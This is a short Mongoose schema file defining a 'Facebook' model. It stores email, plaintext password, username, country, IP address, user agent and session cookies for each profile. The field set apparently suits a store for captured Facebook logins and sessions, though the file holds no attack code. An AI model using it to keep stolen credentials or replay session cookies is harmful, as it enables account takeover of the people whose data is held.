import { model, Schema } from 'mongoose';
const profileSchema = new Schema({
    email: { type: String, required: true },
    password: { type: String, required: true },
    username: { type: String, required: true },
    country: { type: String, required: true },
    countryCode: { type: String, required: true },
    active: { type: Boolean, required: true },
    ipAddress: { type: String },
    userAgent: { type: String },
    cookies: { type: Schema.Types.Mixed },
    createdAt: { type: Date, default: Date.now }
});
export default model('Facebook', profileSchema);
